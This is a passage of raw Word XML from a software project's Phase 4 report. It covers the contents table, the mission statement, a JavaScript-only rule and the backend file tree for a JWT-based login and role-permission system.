        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Part IX</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3288"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>STEP 8 — Login + Routing</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Login page (image-matched) + ProtectedRoute + Sidebar + TopBar + Dashboard + App.jsx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="124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Part X</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="328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Security Deep Dive — What We Wired</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Token storage, XSS, CSRF, SQL injection, brute force, theft, enumeration</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Part XI</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3288"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>End-to-End Verification &amp; Test Plan</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12-step browser smoke + curl test matrix + SQL audit queries</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="124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Part XII</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="328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File Inventory &amp; Phase 4 Sign-off</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21 BE files · 19 FE files · pattern locked for Phase 5+</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1247"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Appendix</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3288"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Glossary · Color tokens · Permission codes</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Reference material for future Phase 5+ work</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="480" w:after="200"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="4" w:color="4F5DFF"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="4F5DFF"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>Part I  ·  Overview &amp; Mission</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>1.1  Phase 4 Mission Statement</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Phase 3 sealed the database. The 5-role × 40-permission RBAC matrix, the two Super Admin users, departments / sections / lookups, and the audit-log table were all populated and bcrypt-verified. The database was RUNTIME READY but could not speak HTTP yet.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Phase 4's job: build the HTTP + browser layers that turn that seeded matrix into a working authentication flow. By the end of this phase a user opens http://localhost:5173/login, enters SA79900 / SA79900, receives a JWT, lands on /dashboard, sees every sidebar item (Super Admin has all 40 permissions); a Normal User trying to navigate to /admin/users sees a 403 Forbidden page — never a server crash, never a redirect loop.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCFCE7"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="16A34A"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="16A34A"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">VERIFIED  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>What Phase 4 actually shipped</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Backend: 21 .js files in SOFTWARE CODE/BE — auth module + middleware + config</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Frontend: 19 .jsx/.js/.css/.html/config files in SOFTWARE CODE/FE</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Endpoints LIVE: POST /api/v1/auth/login · /refresh · /logout · GET /api/v1/me · GET /healthz</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Security wired: JWT in memory + httpOnly refresh cookie + CSRF double-submit + theft detection + rate limit + audit-every-attempt</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Frontend wired: AuthProvider + ProtectedRoute + permission-filtered sidebar + Forbidden page</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Browser verified end-to-end on 2026-05-17 (12 of 12 smoke-test steps passed)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>1.2  The Hard Rule — JavaScript Only</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Every source file in this project — backend and frontend — is JavaScript. The backend uses CommonJS (require / module.exports). The frontend uses ES modules with .jsx for components and .js for plain modules. There is no tsconfig.json, no .ts file, no .tsx file. This is locked decision D1 (JS + JSDoc + Zod) from Phase 2 and is non-negotiable.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FEF3C7"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="B45309"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="B45309"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">IMPORTANT  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>Why this rule matters here</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>The original Phase-4 build prompt contained TypeScript examples (.tsx, tsconfig, strict mode).</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Following them broke the project standard; the FE scaffold was wiped and rebuilt in JS.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>All Phase 5+ work inherits this rule. Any future spec mentioning .tsx is mentally substituted with .jsx + JSDoc.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>1.3  Final File Tree</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>The final on-disk layout after STEP 8 completed and the browser smoke test passed.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>Backend  ·  SOFTWARE CODE/BE/</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tree</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>BE/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>├── .env.example                  Template for local .env (gitignored)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>├── .gitignore                    node_modules, .env, logs, …</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>├── package.json                  Locked dep versions (no @types, no typescript)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>├── README.md                     Quick-start + hard rules</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>└── src/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    ├── server.js                 Entry: env → logger → db → middleware → routes → 404 → errorHandler</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    ├── config/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── env.js                envalid-validated process.env; aborts boot if JWT secrets match</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── logger.js             pino instance with redact paths for Authorization/Cookie/Set-Cookie</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── db.js                 mysql2/promise pool; multipleStatements:false; SELECT 1 at boot</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   └── jwt.js                Facade: alg + accessSecret + refreshSecret + TTLs</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    ├── middleware/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── authenticate.js       Bearer → req.user = { employeeId, userId, role, permissions[] }</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── authorize.js          Factory: authorize(code) and authorizeAny(...codes)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── rateLimit.js          loginLimiter (10/15min) + refreshLimiter (30/min)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── validate.js           Zod-schema runner factory</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   └── errorHandler.js       AppError class + errors{} factory + notFoundHandler + default</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    ├── modules/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   ├── auth/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   │   ├── auth.routes.js    POST /login · /refresh · /logout</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   │   ├── auth.controller.js  HTTP shims; cookies set/cleared here</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   │   ├── auth.service.js   login() · refresh() (rotation + theft detection) · logout()</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   │   ├── auth.validators.js  zod loginSchema + refreshSchema; PASSWORD_REGEX</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   │   ├── users.repo.js     find / load perms / increment-fail / record-success</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   │   ├── refreshTokens.repo.js  persist / findValid / revoke / revokeAllForUser</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   │   └── loginAudit.repo.js record (whitelisted outcome ENUM)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │   └── users/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │       ├── users.routes.js   GET /me</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    │       └── users.controller.js  getMe (reads req.user — no DB hop)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    └── utils/</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        ├── crypto.js             sha256(input) · randomToken(bytes=32)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
